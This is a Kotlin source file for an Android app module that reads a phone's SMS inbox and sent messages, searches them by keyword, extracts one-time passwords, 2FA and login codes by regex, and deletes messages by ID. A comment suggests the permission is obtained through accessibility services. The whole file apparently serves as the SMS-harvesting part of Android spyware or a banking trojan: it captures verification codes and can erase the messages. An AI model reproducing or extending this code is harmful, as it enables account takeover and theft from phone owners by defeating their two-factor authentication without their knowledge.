// ============================================================
// FILE: android/app/src/main/java/com/xrc/sensors/SMSReader.kt
// ============================================================
package com.xrc.sensors

import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.util.Log

/**
 * SMSReader — reads SMS inbox/outbox from the content provider.
 *
 * Requires READ_SMS permission (granted during install or A11Y).
 */
class SMSReader(private val context: Context) {
    companion object {
        private const val TAG = "SMSReader"
        private const val URI_SMS_INBOX = "content://sms/inbox"
        private const val URI_SMS_SENT = "content://sms/sent"
    }

    /**
     * Read SMS inbox messages.
     * Returns list of maps with address, body, date, type.
     */
    fun readInbox(limit: Int = 50): List<Map<String, Any>> {
        return readSms(URI_SMS_INBOX, limit)
    }

    /**
     * Read sent SMS messages.
     */
    fun readSent(limit: Int = 50): List<Map<String, Any>> {
        return readSms(URI_SMS_SENT, limit)
    }

    /**
     * Read all SMS (inbox + sent combined).
     */
    fun readAll(limit: Int = 100): Map<String, List<Map<String, Any>>> {
        return mapOf(
            "inbox" to readInbox(limit / 2),
            "sent" to readSent(limit / 2)
        )
    }

    /**
     * Search SMS for specific keywords.
     */
    fun search(keywords: List<String>, limit: Int = 50): List<Map<String, Any>> {
        val all = readInbox(200) + readSent(200)
        return all.filter { msg ->
            val body = (msg["body"] as? String)?.lowercase() ?: ""
            keywords.any { body.contains(it.lowercase()) }
        }.take(limit)
    }

    /**
     * Find OTP/SMS codes (verification codes).
     */
    fun findOTPs(limit: Int = 50): List<Map<String, Any>> {
        val all = readInbox(limit)
        val otpPattern = Regex("""\b(\d{4,8})\b""")
        return all.filter { msg ->
            val body = (msg["body"] as? String) ?: ""
            // FIXED: raw string is now properly terminated with """
            body.contains(
                Regex("""(code|otp|verification|PIN|password|auth|2FA|login)""", RegexOption.IGNORE_CASE)
            )
        }.map { msg ->
            val body = (msg["body"] as? String) ?: ""
            val codes = otpPattern.findAll(body).map { it.value }.toList()
            msg + ("codes" to codes)
        }
    }

    /**
     * Delete an SMS by its ID.
     */
    fun deleteSms(id: String): Boolean {
        return try {
            val uri = Uri.parse("content://sms/$id")
            context.contentResolver.delete(uri, null, null) > 0
        } catch (e: Exception) {
            Log.w(TAG, "Delete SMS failed: ${e.message}")
            false
        }
    }

    private fun readSms(uriStr: String, limit: Int): List<Map<String, Any>> {
        val messages = mutableListOf<Map<String, Any>>()
        try {
            val uri = Uri.parse(uriStr)
            val cursor: Cursor? = context.contentResolver.query(
                uri,
                arrayOf("_id", "address", "body", "date", "type", "read"),
                null, null, "date DESC LIMIT $limit"
            )
            cursor?.use { c ->
                while (c.moveToNext()) {
                    val id = c.getString(c.getColumnIndexOrThrow("_id"))
                    val address = c.getString(c.getColumnIndexOrThrow("address")) ?: ""
                    val body = c.getString(c.getColumnIndexOrThrow("body")) ?: ""
                    val date = c.getLong(c.getColumnIndexOrThrow("date"))
                    val type = c.getInt(c.getColumnIndexOrThrow("type"))
                    val read = c.getInt(c.getColumnIndexOrThrow("read"))

                    messages.add(
                        mapOf(
                            "id" to id,
                            "address" to maskAddress(address),
                            "body" to body,
                            "date" to date,
                            "timestamp" to java.text.SimpleDateFormat(
                                "yyyy-MM-dd HH:mm:ss",
                                java.util.Locale.US
                            ).format(java.util.Date(date)),
                            "type" to if (type == 1) "inbox" else "sent",
                            "read" to (read == 1)
                        )
                    )
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Read SMS failed: ${e.message}")
        }
        return messages
    }

    private fun maskAddress(address: String): String {
        return when {
            address.length >= 6 -> "${address.take(3)}***${address.takeLast(3)}"
            address.length >= 4 -> "${address.take(2)}***"
            else -> address
        }
    }
}
